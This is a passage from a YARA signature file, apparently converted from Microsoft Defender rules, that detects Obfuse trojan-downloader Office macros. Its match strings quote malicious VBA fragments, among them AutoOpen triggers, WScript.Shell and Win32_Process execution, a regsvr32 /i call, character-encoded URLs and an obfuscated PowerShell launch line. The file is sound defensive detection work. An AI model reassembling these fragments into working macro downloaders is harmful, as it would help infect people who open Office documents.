        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {20 3d 20 45 6e 76 69 72 6f 6e 28 22 77 69 6e 64 69 72 22 29 20 2b 20 22 5c 53 79 73 57 4f 57 36 34 5c 72 75 6e 64 6c 6c 33 32 2e 65 78 65 22 20 2b 20 22 20 22 22 22 20 2b 20 [0-32] 20 2b 20 22 22 22 2c 5f 6c 73 20 48 69 22}  //weight: 1, accuracy: Low
        $x_1_2 = {20 3d 20 45 6e 76 69 72 6f 6e 28 22 77 69 6e 64 69 72 22 29 20 2b 20 22 5c 53 79 73 74 65 6d 33 32 5c 72 75 6e 64 6c 6c 33 32 2e 65 78 65 22 20 2b 20 22 20 22 22 22 20 2b 20 [0-32] 20 2b 20 22 22 22 2c 5f 6c 73 20 48 69 22}  //weight: 1, accuracy: Low
        $x_1_3 = {28 42 79 56 61 6c 20 30 2c 20 42 79 56 61 6c 20 56 61 72 50 74 72 28 [0-32] 28 30 29 29 2c 20 42 79 56 61 6c 20 30 26 2c 20 42 79 56 61 6c 20 30 26 2c 20 30 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_EX_2147735862_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EX"
        threat_id = "2147735862"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {43 72 65 61 74 65 [0-1] [0-32] 20 2b 20 [0-37] 20 2b 20}  //weight: 2, accuracy: Low
        $x_1_2 = {47 65 74 4f 62 6a 65 63 74 28 [0-16] 28 22 57 69 6e 6d 67 6d 74 73 3a 57 69 6e 33 32 5f 50 72 6f 63 65 73 53 22 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = "\"s:Win32_ProcesSstartup\"))" ascii //weight: 1
        $x_1_4 = {47 65 74 4f 62 6a 65 63 74 28 [0-16] 28 22 77 69 6e 6d 67 6d 74 73 3a 57 69 6e 33 32 22 20 2b 20 22 5f 50 72 6f 63 65 73 73 22 29 29}  //weight: 1, accuracy: Low
        $x_1_5 = {47 65 74 4f 62 6a 65 63 74 28 [0-16] 28 22 77 69 6e 6d 67 22 20 2b 20 [0-16] 28 22 6d 74 73 3a 57 69 6e 33 32 22 29 20 2b 20 22 5f 50 72 6f 63 65 73 73 22 29 29}  //weight: 1, accuracy: Low
        $x_1_6 = "(\"mts:Win32\") + \"_Process\"))" ascii //weight: 1
        $x_1_7 = {28 22 57 69 6e 6d 47 6d 74 73 3a 57 69 22 20 2b 20 [0-16] 28 22 6e 33 32 5f 50 72 6f 63 65 73 73 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_8 = {28 22 77 69 6e 22 20 2b 20 [0-16] 28 [0-16] 28 22 6d 67 6d 74 73 3a 77 22 29 29 20 2b 20 22 69 6e 33 32 5f 70 72 6f 63 65 73 73 22 29 29}  //weight: 1, accuracy: Low
        $x_1_9 = "GetObject(\"wi\" + \"n\" + \"mg\" + \"mts:w\" + \"in32\" + \"_proc\" + \"ess\") _" ascii //weight: 1
        $x_1_10 = "+ \"mts:w\" + \"in32\" + \"_proc\" _" ascii //weight: 1
        $x_1_11 = "(\"mts:W\" + \"in\" + \"32_Process\")" ascii //weight: 1
        $x_1_12 = "+ \"in\" + \"32_Process\") + _" ascii //weight: 1
        $x_1_13 = "CreateObject(\"winmgmts:Win32_Process\")" ascii //weight: 1
        $x_1_14 = "Object(\"winmgmts:Wi\" + \"n32_Process\")" ascii //weight: 1
        $x_1_15 = {2b 20 22 77 69 6e 6d 67 6d 74 73 3a 57 69 22 20 2b 20 [0-16] 20 2b 20 22 6e 33 32 5f 50 72 6f 63 65 73 73 22 20 2b}  //weight: 1, accuracy: Low
        $x_1_16 = {53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 [0-20] 20}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_1_*))) or
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_EY_2147735865_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EY"
        threat_id = "2147735865"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "autoopen( _" ascii //weight: 1
        $x_1_2 = "ShowWindow = vbFalse - vbFalse" ascii //weight: 1
        $x_1_3 = "= GetObject(CStr(\"Winmgmts:Win32_ProcesS\"))" ascii //weight: 1
        $x_1_4 = "GetObje.Crea = " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KC_2147735889_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KC"
        threat_id = "2147735889"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 6c 6c 23 28 [0-96] 43 65 6c 6c 73 28}  //weight: 1, accuracy: Low
        $x_1_2 = "Application.International(" ascii //weight: 1
        $x_1_3 = "Asc(Mid$(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KC_2147735889_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KC"
        threat_id = "2147735889"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "20"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {43 61 6c 6c 20 53 68 65 6c 6c 28 73 74 72 50 72 6f 67 72 61 6d 4e 61 6d 65 2c 20 [0-32] 29 0d 0a 45 6e 64 20 53 75 62}  //weight: 10, accuracy: Low
        $x_10_2 = {20 3d 20 45 6e 76 69 72 6f 6e [0-1] 28 22 55 53 45 52 50 52 4f 46 49 4c 45 22 29 20 26 20 53 70 6c 69 74 28 22 5c 41 70 70 44 61 74 61 5c 21 [0-21] 22 2c 20 22 21 22 29 28 30 29 20 2b 20 53 70 6c 69 74 28 22 [0-21] 21 22 20 26 20 70 61 74 68 5f 64 6f 6d 2c 20 22 21 22 29 28 31 29 20 2b 20 53 70 6c 69 74 28}  //weight: 10, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_EZ_2147735957_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EZ"
        threat_id = "2147735957"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = {53 68 65 6c 6c [0-2] 20 5f}  //weight: 1, accuracy: Low
        $x_1_3 = {49 6e 6c 69 6e 65 53 68 61 70 65 73 28 [0-48] 29 20 5f}  //weight: 1, accuracy: Low
        $x_1_4 = ".AlternativeText," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FA_2147739713_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FA"
        threat_id = "2147739713"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {2e 43 72 65 61 74 65 [0-1] [0-32] 2c 20 [0-37] 2c 20}  //weight: 2, accuracy: Low
        $x_1_2 = "= \"mts:Win32_Proces\"" ascii //weight: 1
        $x_1_3 = "= \"mts\" + \":Win32_Proces\"" ascii //weight: 1
        $x_1_4 = "+ \":Win32\" + \"_Proces\"" ascii //weight: 1
        $x_1_5 = "+ \"mgmts:Win32_Process\"" ascii //weight: 1
        $x_1_6 = "+ \"mgmts:Win\" + \"32_Process\"" ascii //weight: 1
        $x_1_7 = "+ \"mts:Win32_Process\"" ascii //weight: 1
        $x_1_8 = "CreateObject((\"winmg\" _" ascii //weight: 1
        $x_1_9 = {53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 [0-20] 20}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_1_*))) or
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_KD_2147739745_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KD"
        threat_id = "2147739745"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "20"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "sURL = Chr(&H68) & Chr(&H74) & Chr(&H74) & Chr(&H70) & Chr(&H3A) & Chr(&H2F) & Chr(&H2F) & " ascii //weight: 10
        $x_10_2 = "sURLDoc = Chr(&H68) & Chr(&H74) & Chr(&H74) & Chr(&H70) & Chr(&H3A) & Chr(&H2F) & Chr(&H2F) & " ascii //weight: 10
        $x_10_3 = ".Run (\"regsvr32.exe /s /i \" & " ascii //weight: 10
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KE_2147740022_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KE"
        threat_id = "2147740022"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_10_1 = " = Right$(Mid$(Mid$(Mid$(Right$(Left$(Left$(" ascii //weight: 10
        $x_10_2 = " = Environ$(StrReverse(mlw(" ascii //weight: 10
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FB_2147740057_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FB"
        threat_id = "2147740057"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {2e 43 72 65 61 74 65 [0-1] 28 [0-16] 20 2b 20 [0-37] 20 2b 20}  //weight: 2, accuracy: Low
        $x_1_2 = {43 61 6c 6c 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-16] 29}  //weight: 1, accuracy: Low
        $x_1_3 = "autoopen( _" ascii //weight: 1
        $x_1_4 = {53 68 6f 77 57 69 6e 64 6f 77 [0-1] 20 3d 20 [0-20] 20}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FC_2147740058_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FC"
        threat_id = "2147740058"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-20] 2e [0-16] 29 2e 52 75 6e [0-1] 20 5f}  //weight: 2, accuracy: Low
        $x_1_2 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_3 = "Text, _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FD_2147740135_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FD"
        threat_id = "2147740135"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {43 61 6c 6c 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-16] 2e 20 5f}  //weight: 2, accuracy: Low
        $x_1_2 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_3 = {54 65 78 74 29 2e 52 75 6e [0-1] 28 20 5f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FE_2147740259_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FE"
        threat_id = "2147740259"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 20 [0-33] 28 30 29 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c 2c 20}  //weight: 1, accuracy: Low
        $x_1_2 = {44 69 6d 20 [0-20] 3a 20 53 65 74 20 [0-20] 20 3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-22] 28 31 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {28 53 70 6c 69 74 28 54 68 69 73 57 6f 72 6b 62 6f 6f 6b 2e 53 68 65 65 74 73 28 [0-7] 29 2e 52 61 6e 67 65 28 [0-6] 29 2e 56 61 6c 75 65 2c 20 22 2c 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FF_2147740263_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FF"
        threat_id = "2147740263"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {2e 43 72 65 61 74 65 [0-1] 28 [0-16] 20 2b 20 [0-37] 20 2b 20}  //weight: 2, accuracy: Low
        $x_1_2 = {43 61 6c 6c 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-33] 20 2b 20}  //weight: 1, accuracy: Low
        $x_1_3 = "Sub autoopen()" ascii //weight: 1
        $x_1_4 = {53 68 6f 77 57 69 6e 64 6f 77 [0-1] 20 3d 20 [0-20] 20}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FH_2147740294_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FH"
        threat_id = "2147740294"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_2_2 = {43 61 6c 6c 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-20] 2e 54 65 78 74 29 2e 52 75 6e [0-1] 28 20 5f}  //weight: 2, accuracy: Low
        $x_1_3 = "Text, _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FI_2147740319_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FI"
        threat_id = "2147740319"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 70 6c 69 74 28 54 68 69 73 57 6f 72 6b 62 6f 6f 6b 2e 53 68 65 65 74 73 28 [0-7] 29 2e 52 61 6e 67 65 28 [0-7] 29 2e 56 61 6c 75 65 2c 20 22 2c 22 29 3a 20 44 69 6d 20 [0-32] 3a 20 53 65 74 20 [0-32] 20 3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-32] 28 31 29 29 3a 20 [0-32] 2e 43 72 65 61 74 65 20 [0-32] 28 30 29 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FG_2147740323_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FG"
        threat_id = "2147740323"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = "MsgBox \"Hello\"" ascii //weight: 1
        $x_1_3 = "Private Sub Worksheet_SelectionChange(ByVal Target As Range)" ascii //weight: 1
        $x_2_4 = "CreateObject(\"WScript.Shell\").Run" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FJ_2147740325_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FJ"
        threat_id = "2147740325"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-20] 28 [0-40] 29 29 2e 52 75 6e 20 [0-20] 28 54 68 69 73 57 6f 72 6b 62 6f 6f 6b 2e 53 68 65 65 74 73 28 [0-7] 29 2e 52 61 6e 67 65 28 [0-7] 29 2e 56 61 6c 75 65 29 2c 20 56 61 6c 28 [0-4] 29 [0-21] 20 54 72 75 65}  //weight: 2, accuracy: Low
        $x_1_2 = {26 20 52 69 67 68 74 28 4c 65 66 74 28 [0-21] 2c 20 [0-20] 20 2b 20 28}  //weight: 1, accuracy: Low
        $x_1_3 = {20 2a 20 49 6e 74 28 [0-2] 20 2f 20 [0-2] 20 2d 20 [0-2] 29 20 2d 20 49 6e 74 28}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FK_2147740344_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FK"
        threat_id = "2147740344"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {44 69 6d 20 [0-25] 3a 20 53 65 74 20 [0-25] 20 3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-21] 28 31 29 29 3a 20 [0-25] 2e 43 72 65 61 74 65 20 [0-21] 28 30 29 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c}  //weight: 2, accuracy: Low
        $x_1_2 = {53 70 6c 69 74 28 54 68 69 73 57 6f 72 6b 62 6f 6f 6b 2e 53 68 65 65 74 73 28 [0-7] 29 2e 52 61 6e 67 65 28 [0-7] 29 2e 56 61 6c 75 65 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FL_2147740354_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FL"
        threat_id = "2147740354"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub Auto_Open()" ascii //weight: 1
        $x_1_2 = "c = \"po\" & \"W*er\" & \"sH*el\" & \"L -W 1 -C po\" & \"w*eRs\" & \"he*Ll ([char]45+[char]10*1+[char]110+[char]99) \" & x" ascii //weight: 1
        $x_1_3 = "Set s = CreateObject(\"WsCrip\" & \"t.\" & \"Sh\" & \"ell\")" ascii //weight: 1
        $x_1_4 = "s.Run Replace(c, \"*\", \"\"), 0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FM_2147740355_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FM"
        threat_id = "2147740355"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {44 69 6d 20 [0-25] 3a 20 53 65 74 20 [0-25] 20 3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-25] 28 31 29 29 3a 20 [0-25] 2e 43 72 65 61 74 65 20 [0-25] 28 30 29 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c}  //weight: 2, accuracy: Low
        $x_1_2 = {53 70 6c 69 74 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 [0-25] 29 2e 56 61 6c 75 65 2c 20 22 2c 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FN_2147740363_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FN"
        threat_id = "2147740363"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_2_2 = {49 6e 74 65 72 61 63 74 69 6f 6e 2e 53 68 65 6c 6c [0-1] 20 49 6e 6c 69 6e 65 53 68 61 70 65 73 28 [0-32] 29 2e 41 6c 74 65 72 6e 61 74 69 76 65 54 65 78 74 2c 20 30}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FO_2147740429_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FO"
        threat_id = "2147740429"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {2e 43 72 65 61 74 65 [0-1] 20 [0-16] 20 2b 20 [0-37] 20 2b 20}  //weight: 2, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-16] 28}  //weight: 1, accuracy: Low
        $x_1_3 = "Sub autoopen()" ascii //weight: 1
        $x_1_4 = {53 68 6f 77 57 69 6e 64 6f 77 [0-1] 20 3d 20 [0-20] 20}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FP_2147740431_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FP"
        threat_id = "2147740431"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = "= CreateObject _" ascii //weight: 1
        $x_1_3 = {43 61 6c 6c 20 [0-22] 2e 52 75 6e [0-1] 28 20 5f}  //weight: 1, accuracy: Low
        $x_1_4 = "Text, _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FQ_2147740501_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FQ"
        threat_id = "2147740501"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = ".Text)" ascii //weight: 1
        $x_1_3 = "= CreateObject _" ascii //weight: 1
        $x_1_4 = {43 61 6c 6c 20 [0-22] 2e 52 75 6e [0-1] 28 20 5f}  //weight: 1, accuracy: Low
        $x_1_5 = "+ \"\", _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FR_2147740504_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FR"
        threat_id = "2147740504"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub autoopen()" ascii //weight: 1
        $x_2_2 = {2e 43 72 65 61 74 65 [0-1] 28 [0-16] 20 2b 20 [0-37] 20 2b 20}  //weight: 2, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-16] 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 68 6f 77 57 69 6e 64 6f 77 [0-1] 20 3d 20 [0-20] 20}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FS_2147740573_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FS"
        threat_id = "2147740573"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {44 69 6d 20 [0-34] 20 41 73 20 56 61 72 69 61 6e 74 3a 20 [0-34] 20 3d 20 53 70 6c 69 74 28 54 68 69 73 57 6f 72 6b 62 6f 6f 6b 2e 53 68 65 65 74 73 28 [0-7] 29 2e 52 61 6e 67 65 28 [0-7] 29 2e 56 61 6c 75 65 2c 20 22 2c 22 29}  //weight: 2, accuracy: Low
